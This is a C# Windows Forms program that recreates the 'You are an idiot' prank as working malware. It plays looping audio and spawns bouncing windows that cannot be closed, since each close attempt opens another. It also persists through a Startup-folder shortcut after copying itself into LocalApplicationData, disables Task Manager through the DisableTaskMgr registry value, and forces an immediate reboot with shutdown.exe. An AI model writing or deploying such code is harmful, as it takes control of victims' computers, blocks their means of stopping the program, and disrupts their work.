using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using WMPLib;

namespace YouAreAnIdiotWindowsForms
{
    public class MainForm : Form
    {
        public static MainForm form = new MainForm();
        public Timer colorSwitchTimer;
        public bool isBlack = true;
        public static Timer updateTimer = new Timer
        {
            Interval = 16
        };
        public static List<Form> forms = new List<Form>();
        public static List<FormMovement> movementStates = new List<FormMovement>();
        public static List<bool> useNegativeHeights = new List<bool>();
        public static List<bool> useNegativeWidths = new List<bool>();
        public static Random rand = new Random();

        private WindowsMediaPlayer player;

        // Define a class to track form properties and movement states
        public class FormMovement
        {
            public bool BouncedRight { get; set; }
            public bool BouncedLeft { get; set; }
            public bool BouncedTop { get; set; }
            public bool BouncedBottom { get; set; }
            public Point Velocity { get; set; }

            public FormMovement()
            {
                BouncedRight = false;
                BouncedLeft = false;
                BouncedTop = false;
                BouncedBottom = false;
                Velocity = new Point(16, 16); // Start moving right and down
            }
        }

        public MainForm()
        {
            player = new WindowsMediaPlayer();
            player.URL = "You are an idiot!!.mp3";
            player.settings.setMode("loop", true); // Ensure it loops
            player.controls.play();

            // Create PictureBox
            PictureBox pictureBox = new PictureBox
            {
                // Set GIF file path (Ensure the file exists)
                ImageLocation = "You are an idiot!!.gif",
                SizeMode = PictureBoxSizeMode.StretchImage,
                Dock = DockStyle.Fill
            };

            // Add PictureBox to Form
            this.Controls.Add(pictureBox);

            // Create Button that covers the entire form
            Button button = new Button
            {
                Size = new Size(392, 320),  // Same size as the form
                Location = new Point(0, 0), // Position it at the top-left corner
                Text = "Hello",
                BackColor = Color.Transparent,  // Make it transparent
                FlatStyle = FlatStyle.Flat,     // Remove the border
                ForeColor = Color.Transparent, // Make the text transparent
            };

            // Add Button to form
            this.Controls.Add(button);

            // Set Form properties
            this.Text = "You are an idiot!!";
            this.ClientSize = new Size(392, 320);
            this.Width = 392;
            this.Height = 320;
            this.Icon = new Icon("idiot icon.ico");
            this.BackColor = Color.Black;

            // Create and start timer for color switching
            colorSwitchTimer = new Timer
            {
                Interval = 620 // 0.5 seconds
            };
            colorSwitchTimer.Tick += ColorSwitchTimer_Tick;
            colorSwitchTimer.Start();


        }

        private static void update_Tick(object sender, EventArgs e)
        {
            int index = 0;
            foreach (Form f in forms)
            {
                // Track form's movement state


                // Get screen's bounds manually
                int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
                int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;
                int screenX = Screen.PrimaryScreen.WorkingArea.X;
                int screenY = Screen.PrimaryScreen.WorkingArea.Y;

                if (f.Location.Y + f.Height >= screenHeight - f.Height) useNegativeHeights[index] = true;
                if (f.Location.Y + f.Height <= screenHeight - f.Height) useNegativeHeights[index] = false;
                int fHeight = f.Location.Y;
                if (useNegativeHeights[index]) fHeight = f.Location.Y + f.Height;
                if (!useNegativeHeights[index]) fHeight = f.Location.Y;


                if (f.Location.X + f.Width >= screenWidth - f.Width) useNegativeWidths[index] = true;
                if (f.Location.X + f.Width <= screenWidth - f.Width) useNegativeWidths[index] = false;
                int fWidth = f.Location.X;
                if (useNegativeWidths[index]) fWidth = f.Location.X + f.Width;
                if (!useNegativeWidths[index]) fWidth = f.Location.X;


                if (fWidth >= screenWidth)
                {
                    movementStates[index].Velocity = new Point(-movementStates[index].Velocity.X, movementStates[index].Velocity.Y);
                }

                if (fWidth <= screenX)
                {
                    movementStates[index].Velocity = new Point(-movementStates[index].Velocity.X, movementStates[index].Velocity.Y);
                }

                if (fHeight >= screenHeight)
                {
                    movementStates[index].Velocity = new Point(movementStates[index].Velocity.X, -movementStates[index].Velocity.Y);
                }

                if (fHeight <= screenY)
                {
                    movementStates[index].Velocity = new Point(movementStates[index].Velocity.X, -movementStates[index].Velocity.Y);
                }

                // Update the form location with new velocity
                f.Location = new Point(f.Location.X + movementStates[index].Velocity.X, f.Location.Y + movementStates[index].Velocity.Y);
                //f.Text = $"({fWidth}, {fHeight}), vX: {movementStates[index].Velocity.X}, vY: {movementStates[index].Velocity.Y}, -h: {screenHeight - f.Height}, +h: {screenHeight + f.Height}, -w: {screenWidth - f.Width}, +w: {screenWidth + f.Width}, nH: {useNegativeHeights[index]}, nW: {useNegativeWidths[index]}";
                index++;
            }
        }

        static void DisableTaskManager()
        {
            try
            {
                // Navigate to the Registry key
                string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";

                // Open or create the Registry key
                RegistryKey key = Registry.CurrentUser.CreateSubKey(registryKeyPath);

                if (key != null)
                {
                    // Create the DisableTaskMgr DWORD value and set it to 1 (disable Task Manager)
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                    Console.WriteLine("Task Manager has been disabled.");
                }
                else
                {
                    Console.WriteLine("Failed to access the registry key.");
                }

                // Close the Registry key
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static void CopyFiles()
        {
            try
            {
                // Get the path of the current directory (where the program is running)
                string currentDirectory = Directory.GetCurrentDirectory();

                // Get the path of the Startup folder
                string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                // Ensure the Startup folder exists
                if (!Directory.Exists(startupFolderPath))
                {
                    Console.WriteLine("The folder does not exist.");
                    return;
                }

                // Get all files in the current directory
                string[] files = Directory.GetFiles(currentDirectory);

                foreach (string file in files)
                {
                    // Get the file name
                    string fileName = Path.GetFileName(file);

                    // Create the destination path in the Startup folder
                    string destinationPath = Path.Combine(startupFolderPath, fileName);

                    // Copy the file to the Startup folder
                    File.Copy(file, destinationPath, overwrite: true);

                    Console.WriteLine($"Copied {fileName} to folder.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        static void CreateShortcut(string shortcutPath, string targetPath, string workingDirectory, string description)
        {
            Type type = Type.GetTypeFromProgID("WScript.Shell");
            dynamic shell = Activator.CreateInstance(type);
            dynamic shortcut = shell.CreateShortcut(shortcutPath);

            shortcut.TargetPath = targetPath;
            shortcut.WorkingDirectory = workingDirectory;
            shortcut.Description = description;
            shortcut.Save();

            Marshal.FinalReleaseComObject(shortcut);
            Marshal.FinalReleaseComObject(shell);
        }

        public static void RestartSystem()
        {
            // Command to restart the system
            string restartCommand = "shutdown.exe /r /f /t 0";

            // Create a new process to run the command
            Process.Start("cmd.exe", "/C " + restartCommand);
        }

        private void ColorSwitchTimer_Tick(object sender, EventArgs e)
        {
            // Switch background color
            if (isBlack)
            {
                this.BackColor = Color.White;
            }
            else
            {
                this.BackColor = Color.Black;
            }

            isBlack = !isBlack;
        }

        [STAThread]
        static void Main()
        {
            form.Width = 392;
            form.Height = 320;

            form.Click += IdiotClicked;
            form.DoubleClick += IdiotClicked;
            form.MouseClick += IdiotClicked;
            form.MouseDoubleClick += IdiotClicked;
            form.FormClosing += IdiotClosing;
            // Run the application
            forms.Add(form);
            FormMovement idiotMovement = new FormMovement();
            movementStates.Add(idiotMovement);
            useNegativeHeights.Add(false);
            useNegativeWidths.Add(false);
            updateTimer.Tick += update_Tick;
            updateTimer.Start();
            CopyFiles();
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolderPath, "YouAreAnIdiot.lnk");
            string targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "YouAreAnIdiot.exe");
            CreateShortcut(shortcutPath, targetPath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "YouAreAnIdiot Application");
            if (!File.Exists("restarted") && !Environment.CurrentDirectory.Equals(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)))
            {
                File.Create("restarted");
                DisableTaskManager();
                RestartSystem();
            }
            Application.Run(form);
            int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
            int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;

            // Generate random X and Y coordinates within screen bounds
            int randomX = rand.Next(0, screenWidth - form.Width);
            int randomY = rand.Next(0, screenHeight - form.Height);

            // Set the form's location
            form.Location = new Point(randomX, randomY);
            
        }

        private static void IdiotClosing(object sender, FormClosingEventArgs e)
        {
            // Prevent form from closing
            e.Cancel = true;
            ShowIdiot();
        }

        private static void IdiotClicked(object sender, EventArgs e)
        {
            // Show a new form when clicked
            ShowIdiot();
        }

        private static void ShowIdiot()
        {
            // Create and show a new instance of the MainForm
            MainForm idiot = new MainForm();
            FormMovement idiotMovement = new FormMovement();
            idiot.FormClosing += IdiotClosing;
            idiot.Show();
            forms.Add(idiot);
            movementStates.Add(idiotMovement);
            useNegativeHeights.Add(false);
            useNegativeWidths.Add(false);
            int screenWidth = Screen.PrimaryScreen.WorkingArea.Width;
            int screenHeight = Screen.PrimaryScreen.WorkingArea.Height;

            // Generate random X and Y coordinates within screen bounds
            int randomX = rand.Next(0, screenWidth - idiot.Width);
            int randomY = rand.Next(0, screenHeight - idiot.Height);

            // Set the form's location
            idiot.Location = new Point(randomX, randomY);
        }
    }
}
